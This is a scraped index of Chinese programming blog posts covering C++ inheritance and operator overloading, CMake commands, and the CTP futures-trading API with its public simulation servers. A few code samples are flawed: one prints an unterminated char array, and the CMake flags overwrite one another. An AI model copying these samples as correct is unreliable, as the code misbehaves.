&lt;&lt; this-&gt;a &lt;&lt; ", b = " &lt;&lt; this-&gt;b &lt;&lt; endl; }private: int a; int b;};class Child : public Parent {public: // 当父类只存在有参构造函数时，必须在子类的初始化列表中显示调用 Child(int a, int b, int c) : Parent(a, b) { this-&gt;c = c; cout &lt;&lt; "子类的构造函数被调用" &lt;&lt; endl; } ~Child() { cout &lt;&lt; "子类的析构函数被调用" &lt;&lt; endl; } void printChild() { cout &lt;&lt; "I\'m child, c = " &lt;&lt; this-&gt;c &lt;&lt; endl; }private: int c;};int main() { Child c1(1, 2, 3); c1.printParent(); c1.printChild(); return 0;} 程序运行的输出结果如下： 123456父类的构造函数被调用子类的构造函数被调用I\'m parent, a = 1, b = 2I\'m child, c = 3子类的析构函数被调用父类的析构函数被调用 继承与组合混搭情况下，构造和析构的调用原则继承与组合对象混搭使用的情况下，构造函数与析构函数的调用原则如下： 构造函数的调用：先构造父类，再构造成员变量，最后构造自身 析构函数的调用：先析构自身，再析构成员变量，最后析构父类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#include &lt;iostream&gt;using namespace std;class Object {public: Object(int a, int b) { this-&gt;a = a; this-&gt;b = b; cout &lt;&lt; "Object类的构造函数被调用" &lt;&lt; endl; } ~Object() { cout &lt;&lt; "Object类的析构函数被调用" &lt;&lt; endl; } void printObject() { cout &lt;&lt; "I\'m object, a = " &lt;&lt; this-&gt;a &lt;&lt; ", b = " &lt;&lt; this-&gt;b &lt;&lt; endl; }protected: int a; int b;};class Parent : public Object {public: // 通过初始化列表，调用父类的构造函数 Parent(char* p) : Object(1, 2) { this-&gt;p = p; cout &lt;&lt; "Parent类的构造函数被调用" &lt;&lt; endl; } ~Parent() { cout &lt;&lt; "Parent类的析构函数被调用" &lt;&lt; endl; } void printParent() { cout &lt;&lt; "I\'m parent, p = " &lt;&lt; p &lt;&lt; endl; }protected: char* p;};class Child : public Parent {public: // 通过初始化列表，调用组合对象与父类的构造函数 Child(char* c) : obj1(3, 4), obj2(5, 6), Parent(c) { this-&gt;c = c; cout &lt;&lt; "Child类的构造函数被调用" &lt;&lt; endl; } ~Child() { cout &lt;&lt; "Child类的析构函数被调用" &lt;&lt; endl; } void printChild() { cout &lt;&lt; "I\'m child, p = " &lt;&lt; p &lt;&lt; endl; }protected: char* c; // 组合对象 Object obj1; Object obj2;};int main() { char* str = new char[3]; str[0] = \'J\'; str[1] = \'i\'; str[2] = \'m\'; Child c1(str); c1.printChild(); c1.printParent(); c1.printObject(); return 0;} 程序运行的输出结果如下： 12345678910111213Object类的构造函数被调用Parent类的构造函数被调用Object类的构造函数被调用Object类的构造函数被调用Child类的构造函数被调用I\'m child, p = JimI\'m parent, p = JimI\'m object, a = 1, b = 2Child类的析构函数被调用Object类的析构函数被调用Object类的析构函数被调用Parent类的析构函数被调用Object类的析构函数被调用 继承中的同名成员的处理方式 当子类成员与父类成员同名时，子类依然可以从父类继承同名成员 在子类中通过作用域分辨符 :: 进行同名成员的区分（在子类中使用父类的同名成员，需要显式地使用类名限定符），其作用类似 Java 中的 super 关键字 同名成员存储在内存中的不同位置 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;iostream&gt;using namespace std;class Parent {public: Parent(int a, int b) { this-&gt;a = a; this-&gt;b = b; } void print() { cout &lt;&lt; "I\'m parent, a = " &lt;&lt; a &lt;&lt; ", b = " &lt;&lt; b &lt;&lt; endl; }public: int a; int b;};class Child : public Parent {public: Child(int a, int b) : Parent(a, b) { this-&gt;a = a + 5; this-&gt;b = b + 5; } void print() { cout &lt;&lt; "I\'m child, a = " &lt;&lt; a &lt;&lt; ", b = " &lt;&lt; b &lt;&lt; endl; }public: int a; int b;};int main() { Child child(1, 2); // 子类访问自身的同名成员函数 child.print(); // 子类访问自身的同名成员变量 cout &lt;&lt; "child\'s a = " &lt;&lt; child.a &lt;&lt; endl; cout &lt;&lt; "child\'s b = " &lt;&lt; child.b &lt;&lt; endl; // 子类访问父类的同名成员函数 child.Parent::print(); // 子类访问父类的同名成员变量 cout &lt;&lt; "parent\'s a = " &lt;&lt; child.Parent::a &lt;&lt; endl; cout &lt;&lt; "parent\'s b = " &lt;&lt; child.Parent::b &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 123456I\'m child, a = 6, b = 7child\'s a = 6child\'s b = 7I\'m parent, a = 1, b = 2parent\'s a = 1parent\'s b = 2 派生类中的 static 关键字使用在 C++ 的普通类中，static 关键字的使用可以看 这里，而派生类中 static 关键字的使用说明如下： 基类定义的静态成员，将被所有派生类共享 根据静态成员自身的访问特性和派生类的继承方式，在类层次体系中具有不同的访问性质（遵守派生类成员访问级别控制的原则） 在派生类中访问基类的静态成员，需要显式说明，对应的语法是：类名 :: 成员 或者通过对象访问：对象名 . 成员 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include &lt;iostream&gt;using namespace std;class Parent {public: // 声明公有的静态成员函数 static void print() { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; ", b = " &lt;&lt; b &lt;&lt; endl; }public: // 声明公有的静态成员变量 static int a;private: // 声明私有的静态成员变量 static int b;};// 定义私有的静态成员变量int Parent::b = 50;// 定义公有的静态成员变量，这里不是简单的变量赋值，更重要的是告诉C++编译器，给静态成员变量分配内存, 否则在派生类中用到该变量就会报错int Parent::a = 30;class Child : public Parent {public: int getA() { // 访问从基类继承得到的静态成员变量 return this-&gt;a; } int getA2() { // 访问基类的静态成员变量 return Parent::a; } int getB() { // return b; 错误写法，基类中静态成员自身的访问特性遵守派生类的访问级别控制原则，因此这里不能访问基类中私有的静态成员变量b return 0; } // 调用从基类继承得到的静态成员函数 void print2() { this-&gt;print(); } // 调用基类的静态成员函数 void print1() { Parent::print(); }};int main() { // 在类外访问基类的静态成员变量和静态成员函数 Parent::a++; Parent::print(); cout &lt;&lt; endl; // 在类外访问派生类的静态成员变量和静态成员函数 cout &lt;&lt; "a = " &lt;&lt; Child::a &lt;&lt; endl; Child::print(); cout &lt;&lt; endl; Child c1; cout &lt;&lt; "a = " &lt;&lt; c1.getA() &lt;&lt; endl; cout &lt;&lt; "a = " &lt;&lt; c1.getA2() &lt;&lt; endl; cout &lt;&lt; "a = " &lt;&lt; c1.Parent::a &lt;&lt; endl; cout &lt;&lt; endl; c1.print1(); c1.print2(); c1.Parent::print(); return 0;} 程序运行的输出结果如下： 123456789101112a = 31, b = 50a = 31a = 31, b = 50a = 31a = 31a = 31a = 31, b = 50a = 31, b = 50a = 31, b = 50 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"CMake 入门教程之二常用命令",url:"/posts/881a3bba.html",text:'查找文件查找源文件12345678# 查找 src 目录下的所有源文件，并保存到 SOURCE_FILES 变量aux_source_directory(src SOURCE_FILES)# 查找 src 目录下所有以 .cpp 开头的文件，并保存到 SOURCE_FILES 变量file(GLOB SOURCE_FILES "src/*.cpp")# 递归查找 src 目录下所有以 .cpp 开头的文件，并保存到 SOURCE_FILES 变量file(GLOB_RECURSE SOURCE_FILES "src/*.cpp") 排除指定的文件12345# 查找 src 目录下所有以 .cpp 开头的文件，并保存到 SOURCE_FILES 变量file(GLOB SOURCE_FILES "src/*.cpp")# 排除 example.cpp 源文件list(FILTER SOURCE_FILES EXCLUDE REGEX "example.cpp") 输出目录指定输出目录12345# 指定构建输出的目录（build 目录）set(PROJECT_BINARY_DIR ${PROJECT_SOURCE_DIR}/build)# 指定可执行文件的输出目录（bin 目录）set(EXECUTABLE_OUTPUT_PATH ${PROJECT_SOURCE_DIR}/bin) 编译代码设置编译参数1234567set(CMAKE_CXX_COMPILER "clang++") # 指定使用的 C++ 编译器set(CMAKE_CXX_FLAGS "-std=c++11") # 指定使用的 C++ 的版本set(CMAKE_CXX_FLAGS "-g") # 输出调试信息set(CMAKE_CXX_FLAGS "-Wall") # 开启所有警告set(CMAKE_CXX_FLAGS_DEBUG "-O0") # 调试包不优化set(CMAKE_CXX_FLAGS_RELEASE "-O2 -DNDEBUG") # 发布包优化set(CMAKE_CXX_FLAGS "-lpthread") # 链接 pthread 库 设置预处理指令1234567891011121314#include &lt;iostream&gt;using namespace std;int main() {#ifdef TARGET cout &lt;&lt; "Hello!" &lt;&lt; endl;#else cout &lt;&lt; "World!" &lt;&lt; endl;#endif return 0;} CMake 指定编译参数 1set(CMAKE_CXX_FLAGS "-DTARGET") 调试信息打印日志信息提示 使用 MESSAGE() 指令可以输出指定的日志信息，例如打印 CMake 变量的值 123456# 查找 GoogleTest 库FIND_PACKAGE(GTest REQUIRED)# 显示 GoogleTest 库的路径MESSAGE(STATUS "GTEST_INCLUDE_DIRS : " ${GTEST_INCLUDE_DIRS})MESSAGE(STATUS "GTEST_BOTH_LIBRARIES : " ${GTEST_BOTH_LIBRARIES}) 链接第三方库查找并链接系统的第三方库这里以第三方库 GoogleTest 为例子，其中 GoogleTest 是手动安装到 Linux 系统上的（编译安装或者通过包管理器安装）。 123456789# 查找 GoogleTest 库find_package(GTest REQUIRED)# 显示 GoogleTest 库的路径MESSAGE(STATUS "GTEST_INCLUDE_DIRS : " ${GTEST_INCLUDE_DIRS})MESSAGE(STATUS "GTEST_BOTH_LIBRARIES : " ${GTEST_BOTH_LIBRARIES})# 链接 GoogleTest 库target_link_libraries(${PROJECT_NAME} ${GTEST_BOTH_LIBRARIES}) var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ c语言 linux系统编程"},{title:"CTP 程序化交易基础之一",url:"/posts/d35e15f1.html",text:'CTP 介绍CTP 简介综合交易平台（Comprehensive Transaction Platform，CTP）是专门为期货公司开发的一套期货经纪业务管理系统，由交易、风险控制和结算三大系统组成。其中，交易系统主要负责订单处理、行情转发及银期转账业务，结算系统负责交易管理、帐户管理、经纪人管理、资金管理、费率设置、日终结算、信息查询以及报表管理等，风控系统则主要在盘中进行高速的实时试算，以及时揭示并控制风险。系统能够同时连通国内四家期货交易所，支持国内商品期货和股指期货的交易结算业务，并能自动生成、报送保证金监控文件和反洗钱监控文件。 CTP 架构综合交易平台是基于全内存的交易系统，采用创新的完全精确重演的分布式体系架构，支持 7x24 小时连续交易，运维人员不必每日启停系统，可以做到 “一键运维”，该特性使得综合交易平台新增交易中心以扩展业务规模时不用增加运维人力的成本。支持 FENS 机制的 “一键切换” 多活交易中心也是目前市场上只有 CTP 系统实现了的特性。该机制使得交易系统可在某个交易中心宕机的情况下立即切换到另一个备用交易中心，得以实现真真正正的连续交易。综合交易平台公开并对外开放交易系统接口，使用该接口可以接收交易所的行情数据和执行交易指令。该接口采用开放接口（API）的方式接入，早已在期货界已经形成事实上的行业标准。 CTP API从 CTP 官网（非交易时段禁止访问）可以了解到，CTP API 从 v6.3.15 版开始引入强制看穿式认证规则，CTP 不再兼容之前的 API 版本。目前，CTP API 最新版是 v6.6.1，与 v6.3.15 相比较最大的改动是，InstrumentID 由最长 30 个字节增加到 80 个字节。CTP 生产系统兼容 v6.3.15 及以上版本。但是，大部分期货公司做看穿式认证的仿真系统要求使用新版 API 才能接入。所以，新用户做看穿式认证时首先要确认 API 的版本号。 CTP 仿真系统SimNow 仿真系统SimNow 是上期技术为广大投资者打造的一个最接近真实市场环境的仿真平台，主要面向期货经纪公司和投资者服务，提供整套期货交易的信息化技术平台。SimNow 官网（非交易时段禁止访问），交易者注册 SimNow 仿真账户后，可以使用从 CTP 官网下载 API 接入这套仿真交易系统。开发、测试完成之后，只需要更换用户名、密码、前置地址等信息就可以接入期货公司生产系统进行实盘交易。SimNow 要求 CTP API 的版本是 v6.3.15 及以上才能够接入。 认证信息123BrokerID = "9999"AppID = "SimNow_client_test"AuthCode = "0000000000000000" 值得一提的是，默认的 BrokerID 为 9999，AppID 为 SimNow_client_test，AuthCode 为 0000000000000000（16个0），默认不会开终端认证，程序化用户可以选择不开终端认证接入。 生产仿真环境以下的前置地址，交易时段与真实生产环境（实盘）一致。 电信 12FrontAddr=tcp://180.168.146.187:10201FrontMdAddr=tcp://180.168.146.187:10211 电信 12FrontAddr=tcp://180.168.146.187:10202FrontMdAddr=tcp://180.168.146.187:10212 移动 12FrontAddr=tcp://218.202.237.33:10203FrontMdAddr=tcp://218.202.237.33:10213 测试仿真环境 支持全天交易（7x24），不间断轮播某天行情 SimNow 新注册用户，需要等到第三个交易日才能使用 交易时段：交易日 16：00 ～ 次日 09：00；非交易日 16：00 ～ 次日 15：00 仅服务于 CTP API 开发爱好者，仅为用户提供 CTP API 测试需求，不提供结算等其它服务 12FrontAddr=tcp://180.168.146.187:10130FrontMdAddr=tcp://180.168.146.187:10131 仿真成交规则 期货交易按照交易所公布的买一卖一价对价成交 买入时：如果委托价大于等于卖一价，则成交，成交价为委托价、卖一价、最新价三价取中，如果委托价小于卖一价，不能成交，等待更优的行情才能成交 卖出时：如果委托价小于等于买一价，则成交，成交价为委托价、买一价、最新价三价取中，如果委托价大于买一价，不能成交，等待更优的行情才能成交 仿真交易时间 NSight 仿真系统交易者在 NSight 官网 注册仿真账户后，可以使用从 CTP 官网下载的 API v6.3.15 接入这套仿真交易系统。开发、测试完成之后，只需要更换用户名、密码、前置地址等信息就可以接入期货公司生产系统进行实盘交易。 认证信息123BrokerID = "10010"AppID = ""AuthCode = "" 值得一提的是，默认的 BrokerID 为 10010，AppID 与 AuthCode 均为空字符串。 生产仿真环境以下的前置地址，交易时段与真实生产环境（实盘）一致。 12FrontAddr=tcp://210.14.72.12:4600FrontMdAddr=tcp://210.14.72.12:4602 期货交易终端市面上主流的期货交易终端可以在 SimNow 官网（非交易时段禁止访问）下载。 快期期货交易终端对于量化交易者，在没有自主开发监控客户端之前，快期是一个很不错的选择。这里以 快期 v2 版本举例，若使用快期登录 SimNow 的模拟账户，则只需要在快期的登录界面选择服务器 上期技术-xx 即可，下拉列表里不同的服务器分别使用了不同的前置地址，而 用户代码 直接填写 InvestorID。 CTP 开放平台 CTP 开放平台 CTP 开放平台运行环境监控 CTP 接口兼容模拟交易平台介绍 - 类似 SimNow 参考博客 CTP API 版本说明 CTP API 各版本官方下载 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"量化交易"},{title:"C++ 入门基础之六",url:"/posts/a54941f5.html",text:'大纲 C++ 入门基础之一、C++ 入门基础之二、C++ 入门基础之三 C++ 入门基础之四、C++ 入门基础之五、C++ 入门基础之六 C++ 入门基础之七、C++ 入门基础之八、C++ 入门基础之九 友元函数类的友元函数是定义在类的外部，但有权访问类的所有私有（private）成员和保护（protected）成员。尽管友元函数的原型在类的声明中出现过，但是友元函数并不是类的成员函数，而是普通函数（全局函数）。如果要声明函数为一个类的友元，需要在类定义中该函数原型前使用关键字 friend。 友元函数的规则为什么要引入友元函数： C++ 利用 friend 修饰符，可以让一些设定的函数能够对一些保护数据进行访问，避免把类的成员全部设置成 public，最大限度的保护数据成员的安全。同时友元函数可以实现类之间的数据共享，减少系统开销，提高效率。由于友元函数破环了封装机制，因此推荐尽量使用成员函数，除非不得已的情况下才使用友元函数。 什么时候使用友元函数： 多个类要共享数据的时候 运算符重载的某些场合需要使用友元函数 友元函数的参数： 因为友元函数没有 this 指针，所以参数会有三种情况： a) 要访问非 static 成员时，需要对象做参数 b) 要访问 static 成员或全局变量时，则不需要对象做参数 c) 如果做参数的对象是全局对象，则不需要对象做参数 友元函数的位置： 因为友元函数是类外的函数（普通函数），所以它的声明可以放在类的私有段（private）或公有段（public），两者都是没有区别的 一个函数可以是多个类的友元函数，只需要在各个类中分别声明即可 友元函数的调用： 可以直接调用友元函数，不需要通过对象或指针 友元函数的调用与普通函数（全局函数）的调用方式和原理一致 友元函数的使用123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class A {public: A(int a) { this-&gt;a = a; } int getA() { return this-&gt;a; } // 声明友元函数 friend void update2(A* p);private: int a;};void update1(A* p) { // p-&gt;a = 30; // 错误写法，在普通函数（全局函数）内，私有数据成员不能在类外被访问}void update2(A* p) { p-&gt;a = 30; // 在友元函数内，可以通过对象参数访问私有数据成员}int main() { A* a = new A(10); update2(a); // 调用友元函数 cout &lt;&lt; "a = " &lt;&lt; a-&gt;getA() &lt;&lt; endl; delete a; return 0;} 程序运行的输出结果如下： 1a = 30 友元类友元类的所有成员函数都是另一个类的友元函数，都可以访问另一个类中的私有（private）成员和保护（protected）成员。当希望一个类可以访问另一个类的保护数据时，可以将该类声明为另一类的友元类。定义友元类的语法格式为 friend class 类名;，其中类名必须是程序中的一个已定义过的类。值得一提的是，友元类通常设计为一种对数据操作或类之间传递消息的辅助类。 友元类的规则 友元关系不能被继承 友元关系是单向的，不具有交换性。若类 B 是类 A 的友元，则类 A 不一定是类 B 的友元，要看在类 B 中是否有相应的声明 友元关系不具有传递性，若类 B 是类 A 的友元，类 C 是 类 B 的友元，则类 C 不一定是类 A 的友元，要看类 A 中是否有相应的声明 友元类的使用1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;using namespace std;class A {public: // 声明友元类 B friend class B; void print() { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class B {public: void setValue(int a) { aObj.a = a; // 类 B 是类 A 的友元类，因此 B 类的所有成员函数都可以访问 A 类的私有成员或者保护成员 } void print() { aObj.print(); }private: A aObj;};int main() { B b; b.setValue(100); b.print(); return 0;} 程序运行的输出结果如下： 1a = 100 运算符重载基础所谓重载，就是重新赋予新的含义。函数重载就是对一个已有的函数赋予新的含义，使之实现新功能，因此，一个函数名就可以用来代表不同功能的函数，也就是 一名多用。运算符也可以重载，实际上，开发者已经在不知不觉之中使用了运算符重载。例如，大家都已习惯于用加法运算符 + 对整数、单精度数和双精度数进行加法运算，如 5 + 8，5.8 + 3.67 等，其实计算机对整数、单精度数和双精度数的加法操作过程是很不相同的，但由于 C++ 已经对运算符 + 进行了重载，所以就能适用于 int、float、doUble 类型的运算。又如 &lt;&lt; 是 C++ 的位运算中的位移运算符（左移），但在输出操作中又是与流对象 cout 配合使用的流插入运算符。&gt;&gt; 也是位移运算符 (右移），但在输入操作中又是与流对象 cin 配合使用的流提取运算符。这就是运算符重载 (Operator Overloading)。C++ 系统对 &lt;&lt; 和 &gt;&gt; 进行了重载，用户在不同的场合下使用它们时，作用是不同的。对 &lt;&lt; 和 &gt;&gt; 的重载处理是放在头文件 stream 中的。因此，如果要在程序中用 &lt;&lt; 和 &gt;&gt; 作流插入运算符和流提取运算符，必须在本文件模块中包含头文件 stream，当然还应当包括命名空间的使用声明 using namespace std。 运算符重载的语法 例如： 使用类成员函数完成 "-" 运算符重载的语法：Complex operator-(Complex &amp;c2) 使用友元函数完成 "+" 运算符重载的语法：Complex operator+(Complex &amp;c1, Complex &amp;c2) 运算符重载的限制 运算符重载的两种方式 前置与后置运算符重载规则在 C++ 中是通过一个占位参数（int）来区分前置运算符和后置运算符的重载，例如 ++a、a++、--b、b--。 运算符重载的简单使用案例二元运算符重载在下述的案例中，演示了如何使用类成员函数和友元函数实现二元运算符的重载。值得一提的是，除了使用友元函数外，还可以使用全局函数（普通函数）来实现运算符的重载，不同的是使用友元函数更方便，可以直接访问类的所有私有（private）成员和保护（protected）成员。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;using namespace std;class Complex {private: int a; int b;public: Complex(int a = 0, int b = 0) { this-&gt;a = a; this-&gt;b = b; } void print() { cout &lt;&lt; "a=" &lt;&lt; this-&gt;a &lt;&lt; ", b=" &lt;&lt; this-&gt;b &lt;&lt; endl; }public: // 使用类成员函数完成 "-" 运算符的重载 Complex operator-(Complex&amp; c2) { Complex c3(this-&gt;a - c2.a, this-&gt;b - c2.b); return c3; } // 声明用于 "+" 运算符重载的友元函数 friend Complex operator+(Complex&amp; c1, Complex&amp; c2);};// 定义友元函数完成 "+" 运算符的重载Complex operator+(Complex&amp; c1, Complex&amp; c2) { Complex c3(c1.a + c2.a, c1.b + c2.b); return c3;}int main() { Complex c1(1, 2), c2(3, 4); // 直接调用友元函数 Complex c3 = operator+(c1, c2); c3.print(); // 使用友元函数完成 "+" 运算符的重载 Complex c4 = c1 + c2; c4.print(); // 直接调用类成员函数 Complex c5 = c1.operator-(c2); c5.print(); // 使用类成员函数完成 "-" 运算符的重载 Complex c6 = c1 - c2; c6.print(); return 0;} 程序运行的输出结果如下： 1234a=4, b=6a=4, b=6a=-2, b=-2a=-2, b=-2 一元运算符重载在下述的案例中，演示了如何使用类成员函数和友元函数实现一元运算符的重载。值得一提的是，除了使用友元函数外，还可以使用全局函数（普通函数）来实现运算符的重载，不同的是使用友元函数更方便，可以直接访问类的所有私有（private）成员和保护（protected）成员。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;iostream&gt;using namespace std;class Complex {private: int a; int b;public: Complex(int a = 0, int b = 0) { this-&gt;a = a; this-&gt;b = b; } void print() { cout &lt;&lt; "a=" &lt;&lt; this-&gt;a &lt;&lt; ", b=" &lt;&lt; this-&gt;b &lt;&lt; endl; }public: // 使用类成员函数完成 "前置--" 运算符的重载 Complex&amp; operator--() { this-&gt;a--; this-&gt;b--; return *this; } // 使用类成员函数完成 "后置--" 运算符的重载 // 使用占位参数进行函数重载，是为了解决与 "前置--" 类成员函数冲突的问题 Complex operator--(int) { Complex tmp(this-&gt;a, this-&gt;b); this-&gt;a--; this-&gt;b--; return tmp; } // 声明用于 "前置++" 运算符重载的友元函数 friend Complex&amp; operator++(Complex&amp; c1); // 声明用于 "后置++" 运算符重载的友元函数 // 使用占位参数进行函数重载，是为了解决与 "前置++" 友元函数冲突的问题 friend Complex operator++(Complex&amp; c1, int);};// 定义友元函数完成 "前置++" 运算符的重载Complex&amp; operator++(Complex&amp; c1){ c1.a++; c1.b++; return c1;}// 定义友元函数完成 "后置++" 运算符的重载Complex operator++(Complex&amp; c1, int) { Complex tmp(c1.a, c1.b); c1.a++; c1.b++; return tmp;}int main() { Complex c1(1, 2), c2(8, 9), c3(15, 16), c4(24, 25); // 使用友元函数完成 "前置++" 运算符的重载 ++c1; c1.print(); // 使用类成员函数完成 "前置--" 运算符的重载 --c2; c2.print(); // 使用友元函数完成 "后置++" 运算符的重载 Complex c5 = c3++; c3.print(); c5.print(); // 使用类成员函数完成 "后置--" 运算符的重载 Complex c6 = c4--; c4.print(); c6.print(); return 0;} 程序运行的输出结果如下： 123456a=2, b=3a=7, b=8a=16, b=17a=15, b=16a=23, b=24a=24, b=25 左移运算符的重载值得一提的是，&lt;&lt; 左移运算符和 &gt;&gt; 右移运算符的重载，只能使用友元函数或者全局函数，不能使用类成员函数，这也是友元函数的重要作用之一。 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;using namespace std;class Complex {private: int a; int b;public: Complex(int a = 0, int b = 0) { this-&gt;a = a; this-&gt;b = b; }public: // 声明友元函数实现 "&lt;&lt;" 左移运算符的重载 friend ostream&amp; operator&lt;&lt;(ostream&amp; out, Complex&amp; c1);};// 定义友元函数实现 "&lt;&lt;" 左移运算符的重载ostream&amp; operator&lt;&lt;(ostream&amp; out, Complex&amp; c1) { out &lt;&lt; "a=" &lt;&lt; c1.a &lt;&lt; ", b=" &lt;&lt; c1.b &lt;&lt; endl; return out;}int main() { Complex c1(1, 2), c2(6, 9); cout &lt;&lt; c1 &lt;&lt; c2; return 0;} 程序运行的输出结果如下： 12a=1, b=2a=6, b=9 等号运算符的重载 = 运算符的结合性是从右到左 = 运算符的重载用于对象数据的复制 必须通过类成员函数重载 = 运算符，不能使用友元函数 = 运算符重载的函数原型为：类型 &amp; 类名 :: operator= ( const 类名 &amp; ) ; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;iostream&gt;#include "string.h"using namespace std;class Name {private: char* p; int len;public: Name(const char* name) { cout &lt;&lt; "有参构造函数被调用了" &lt;&lt; endl; len = strlen(name); p = new char[len + 1]; strcpy(p, name); } // 深拷贝的实现 Name(const Name&amp; name) { cout &lt;&lt; "拷贝构造函数被调用了" &lt;&lt; endl; len = name.getLen(); p = new char[len + 1]; strcpy(p, name.getP()); } ~Name() { cout &lt;&lt; "析构函数被调用了" &lt;&lt; endl; if (p != NULL) { delete[] p; p = NULL; len = 0; } } char* getP() const { return p; } int getLen() const { return len; }public: // 使用类成员函数实现 "=" 运算符的重载 Name&amp; operator=(const Name&amp; n) { // 释放内存空间 if (p != NULL) { delete[] p; p = NULL; len = 0; } // 重新分配内存空间 len = n.getLen(); p = new char[len + 1]; strcpy(p, n.getP()); return *this; }};int main() { Name obj1("Peter"); Name obj2("Tom"); Name obj4("Tim"); // 会自动调用拷贝构造函数（属于深拷贝） Name obj3 = obj1; cout &lt;&lt; "obj3.name: " &lt;&lt; obj3.getP() &lt;&lt; ", obj3.len: " &lt;&lt; obj3.getLen() &lt;&lt; endl; // 不会自动调用拷贝构造函数（属于浅拷贝） // 默认情况下，若这里不对 "=" 运算符进行重载，最终程序会异常终止运行（由于同一块内存空间被释放两次导致） obj4 = obj1; cout &lt;&lt; "obj4.name: " &lt;&lt; obj4.getP() &lt;&lt; ", obj4.len: " &lt;&lt; obj4.getLen() &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 12345678910有参构造函数被调用了有参构造函数被调用了有参构造函数被调用了拷贝构造函数被调用了obj3.name: Peter, obj3.len: 5obj4.name: Peter, obj4.len: 5析构函数被调用了析构函数被调用了析构函数被调用了析构函数被调用了 函数运算符的重载在下述的案例中，演示了如何使用类成员函数重载函数运算符 ()，值得一提的是，不能用友元函数重载函数运算符 ()。 12345678910111213141516#include &lt;iostream&gt;using namespace std;class Test {public: int operator()(int a, int b) { return a + b; }};int main() { Test test; cout &lt;&lt; test(3, 4) &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 17 运算符重载进阶为什么不要重载 &amp;&amp; 和 || 操作符 a) &amp;&amp; 和 || 是 C++ 中非常特殊的操作符 b) &amp;&amp; 和 || 内置实现了短路规则 c) 操作符重载是靠函数重载来完成的 d) 操作数作为函数参数传递 e) C++ 的函数参数都会被求值，无法实现短路规则 不同函数实现运算符重载的应用场景友元函数和类成员函数的选择方法： a) =、[]、() 和 -&gt; 运算符，只能通过类成员函数进行重载 b) 当无法修改左操作数的类时，只能通过友元函数进行重载，例如 &lt;&lt; 与 &gt;&gt; 运算符 友元函数重载 &lt;&lt; 与 &gt;&gt; 运算符： istream 和 ostream 是 C++ 的预定义流类 cin 是 istream 的对象，cout 是 ostream 的对象 运算符 &lt;&lt; 由 ostream 重载为插入操作，用于输出基本类型数据 运算符 &gt;&gt; 由 istream 重载为提取操作，用于输入基本类型数据 只能使用友元函数或者全局函数重载 &lt;&lt; 和 &gt;&gt; 运算符，输出和输入用户自定义的数据类型 类成员函数与友元函数实现运算符重载的步骤： a) 要承认运算符重载是一个函数，写出函数名称，如 operator +() b) 根据操作数，写出函数参数 c) 根据业务，完善函数的返回值（看函数是返回引用、指针还是元素），及实现函数业务；例如当函数的返回值充当左值时，需要返回一个引用 使用友元函数重载运算符的注意事项 a) 友元函数重载运算符常用于运算符的左右操作数类型不相同的场景 b) 在函数的第一个参数需要隐式转换的情形下，使用友元函数重载运算符是正确的选择 c) 友元函数没有 this 指针，所需操作数都必须在函数的参数表中显式声明，很容易实现类型的隐式转换 d) 在 C++ 中不能用友元函数重载的运算符分别有：=、[]、() 和 -&gt; e) 在 C++ 中不要重载 &amp;&amp; 和 || 运算符 f) C++ 的运算符重载遵循函数重载的规则 g) 除了重载运算符 &lt;&lt;、&gt;&gt; 必须使用友元函数之外，其他运算符的重载尽量都使用类成员函数，千万不要滥用友元函数，尤其类模板与友元函数一起使用的时候 运算符重载的综合使用案例重载自定义数组类的各种运算符在本案例中，自定义了数组类 Array，并使用类成员函数分别对 Array 类的 []、=、==、!= 运算符进行重载。 ★点击显示完整的案例代码★ Array.h 